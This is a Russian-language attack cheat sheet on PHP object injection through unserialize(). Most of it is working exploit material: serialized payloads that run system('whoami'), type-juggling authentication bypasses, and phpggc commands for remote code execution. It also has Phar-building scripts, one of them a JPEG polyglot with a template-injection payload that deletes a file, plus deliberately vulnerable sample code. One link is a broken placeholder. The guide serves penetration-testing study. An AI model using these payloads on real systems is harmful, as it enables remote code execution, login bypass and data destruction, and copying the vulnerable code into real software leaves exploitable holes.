* [Общая концепция](#Общая-концепция)
* [Обход аутентификации](#Обход-аутентификации)
* [Внедрение объектов](#Внедрение-объектов)
* [Поиск и использование гаджетов](#Поиск-и-использование-гаджетов)
* [Инструменты](#Инструменты)
* [Десериализация Phar](№Десериализация-Phar)
* [URL](#URL)

> Внедрение PHP-объектов — это уязвимость уровня приложения, которая может позволить выполнять различные виды вредоносных атак, такие как внедрение кода, SQL-инъекция, обход пути и отказ в обслуживании приложения, в зависимости от контекста.
>> Уязвимость возникает, когда вводимые пользователем данные не проходят надлежащую очистку перед передачей в функцию PHP unserialize(). Поскольку PHP допускает сериализацию объектов, злоумышленники могут передавать произвольные сериализованные строки в уязвимый вызов unserialize(), что приводит к внедрению произвольного PHP-объекта(ов) в область приложения.

# Общая концепция

Магические методы которые помогут внедрить PHP-объект:

```__wakeup()``` при десериализации объекта.
```__destruct()``` при удалении объекта. 
```__toString()``` при преобразовании объекта в строку.

Также следует проверить ```wrapper Phar://``` в [File Inclusion](!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!), которая использует внедрение PHP-объекта.

Уязвимый код:

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

Создайте полезную нагрузку, используя существующий код внутри приложения.

* Базовые сериализованные данные

```a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}```

* Выполнение команды

```string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"```

# Обход аутентификации

### Подмена типов

Уязвимый код:

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

Полезная нагрузка:

a:2:{s:8:"username";b:1;s:8:"password";b:1;}

Поскольку true == "str" ​​— это true.

> В PHP 8 и более поздних версиях сравнение 0 == "Example string" оценивается как false, поскольку строки больше не преобразуются неявно в 0 во время сравнения. В результате этот эксплойт невозможен в этих версиях PHP.
>> Поведение при сравнении буквенно-цифровой строки, которая начинается с цифры, остается прежним в PHP 8. Таким образом, 5 == "5 чего-то" по-прежнему рассматривается как 5 == 5.

```
O:11:"credentials":2:{s:8:"username";s:8:"apushkin";s:8:"password";s:15:"4r1naR0d!onovna";} 
Можно изменить тип атрибута password с string на integer и присвоить ему значение 0. Тогда пароль окажется верным в любом случае, а модифицированные данные будут такими:
O:11:"credentials":2:{s:8:"username";s:8:"apushkin";s:8:"password";i:0;} 
```

# Внедрение объекта

Уязвимый код:

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Полезная нагрузка:

```O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}```

Мы можем создать такой массив:

```a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}```

# Поиск и использование гаджетов

> Также называемые "PHP POP Chains", они могут использоваться для получения RCE в системе.

* В исходном коде PHP найти функцию ```unserialize()```.
* Интересные магические методы, такие как ```__construct()```, ```__destruct()```, ```__call()```, ```__callStatic()```, ```__get()```, ```__set()```, ```__isset()```, ```__unset()```, ```__sleep()```, ```__wakeup()```, ```__serialize()```, ```__unserialize()```, ```__toString()```, ```__invoke()```, ```__set_state()```, ```__clone()``` и ```__debugInfo()```

| Метод | Описание |
|-------|----------|
| __construct() | PHP позволяет разработчикам объявлять методы-конструкторы для классов. Классы, имеющие метод-конструктор, вызывают этот метод для каждого вновь создаваемого объекта, поэтому он подходит для любой инициализации, которая может потребоваться объекту перед его использованием. |
| __destruct() | Метод-деструктор будет вызван, как только не останется других ссылок на данный объект, или в любом порядке во время последовательности завершения работы. |
| __call(string $name, array $arguments) | Аргумент $name — имя вызываемого метода. Аргумент $arguments — это перечисляемый массив, содержащий параметры, переданные методу $name. |
| __callStatic(string $name, array $arguments) | Аргумент $name — это имя вызываемого метода. Аргумент $arguments — это перечисляемый массив, содержащий параметры, переданные методу $name. |
| __get(string $name) | Функция __get() используется для чтения данных из недоступных (защищенных или приватных) или несуществующих свойств. |
| __set(string $name, mixed $value) | Функция __set() запускается при записи данных в недоступные (защищенные или приватные) или несуществующие свойства. |
| __isset(string $name) | __isset() срабатывает при вызове isset() или empty() для недоступных (защищенных или приватных) или несуществующих свойств. |
| __unset(string $name) | __unset() вызывается при использовании unset() для недоступных (защищенных или приватных) или несуществующих свойств. |
| __sleep() | serialize() проверяет, есть ли в классе функция с магическим именем __sleep(). Если да, эта функция выполняется перед любой сериализацией. Она может очистить объект и должна возвращать массив с именами всех переменных этого объекта, которые должны быть сериализованы. Если метод ничего не возвращает, сериализуется null и выдается E_NOTICE. |
| __wakeup() | unserialize() проверяет наличие функции с магическим именем __wakeup(). При наличии эта функция может восстановить любые ресурсы объекта. __wakeup() предназначена для восстановления любых соединений с базой данных, которые могли быть потеряны во время сериализации, и выполнения других задач повторной инициализации. |
| __serialize() | serialize() проверяет, есть ли в классе функция с магическим именем __serialize(). Если да, эта функция выполняется перед любой сериализацией. Она должна создать и вернуть ассоциативный массив пар ключ/значение, представляющий сериализованную форму объекта. Если массив не возвращается, будет выдана ошибка TypeError. |
| __unserialize(array $data) | Этой функции будет передан восстановленный массив, возвращенный функцией __serialize(). |
| __toString() | Метод __toString() позволяет классу определить, как он будет реагировать, когда его обрабатывают как строку. |
| __invoke() | Метод __invoke() вызывается, когда скрипт пытается вызвать объект как функцию. |
| __set_state(array $properties) | Этот статический метод вызывается для классов, экспортируемых функцией var_export(). |
| __clone() | После завершения клонирования, если определен метод __clone(), будет вызван метод __clone() вновь созданного объекта, чтобы разрешить изменение всех необходимых свойств. |
| __debugInfo() | Этот метод вызывается функцией var_dump() при дампе объекта для получения свойств, которые необходимо отобразить. Если метод не определен для объекта, будут отображены все открытые, защищенные и закрытые свойства. |

# Инструменты

[ambionics/phpggc](https://github.com/ambionics/phpggc) — это инструмент для генерации полезной нагрузки на основе нескольких фреймворков:

* Laravel
* Symfony
* SwiftMailer
* Monolog
* SlimPHP
* Doctrine
* Guzzle

```
./phpggc monolog/rce1 'phpinfo();' -s
./phpggc monolog/rce1 assert 'phpinfo()'
./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
./phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
./phpggc Symfony/RCE4 exec 'rm /file.txt' | base64
```
```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

# Десериализация Phar

Используя обёртку phar://, можно запустить десериализацию указанного файла, например, file_get_contents("phar://./archives/app.phar").

Корректный PHAR-файл включает четыре элемента:

1. Заглушка: это фрагмент PHP-кода, который выполняется при доступе к файлу в контексте исполняемого файла. Как минимум, заглушка должна содержать __HALT_COMPILER(); в конце. В противном случае ограничений на содержимое Phar-заглушки нет.
2. Манифест: содержит метаданные об архиве и его содержимом.
3. Содержимое файла: содержит сами файлы в архиве.
4. Подпись (необязательно): для проверки целостности архива.

Пример создания Phar-файла для использования пользовательского PDFGenerator.
```php
<?php
class PDFGenerator { }

//Создать новый экземпляр класса Dummy и изменить его свойство
$dummy = new PDFGenerator();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //наша полезная нагрузка

// Удалить любой существующий архив PHAR с таким именем
@unlink("poc.phar");

// Создать новый архив
$poc = new Phar("poc.phar");

// Добавить все операции записи в буфер, не изменяя архив на диске
$poc->startBuffering();

// Установить заглушку
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

/* Добавить новый файл в архив с содержимым "text"*/
$poc["file"] = "text";
// Добавить фиктивный объект в метаданные. Он будет сериализован
$poc->setMetadata($dummy);
// Остановить буферизацию и записать изменения на диск
$poc->stopBuffering();

?>
```

Пример создания Phar с заголовком ```JPEG``` magic byte, поскольку на содержимое заглушки нет ограничений.

```php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// создание нового Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// добавление объекта любого класса в качестве метаданных
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
```php
<?php
class CustomTemplate {}
class Blog {}

if (ini_get('phar.readonly')) {
    die("Run: php -d phar.readonly=0 " . basename(__FILE__) . "\n");
}

$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;

// Создаем реальный минимальный JPEG (1x1 pixel)
$jpg = base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAA8U/9k=');

@unlink('wiener.phar');

$phar = new Phar('wiener.phar');
$phar->startBuffering();
$phar->setStub($jpg . '<?php __HALT_COMPILER(); ?>');
$phar->addFromString('test.txt', 'test');
$phar->setMetadata($object);
$phar->stopBuffering();

copy('wiener.phar', 'wiener.jpg');
@unlink('wiener.phar');

echo "Upload wiener.jpg as avatar\n";
?>
```

# URL

* https://portswigger.net/research/top-10-web-hacking-techniques-of-2018#6
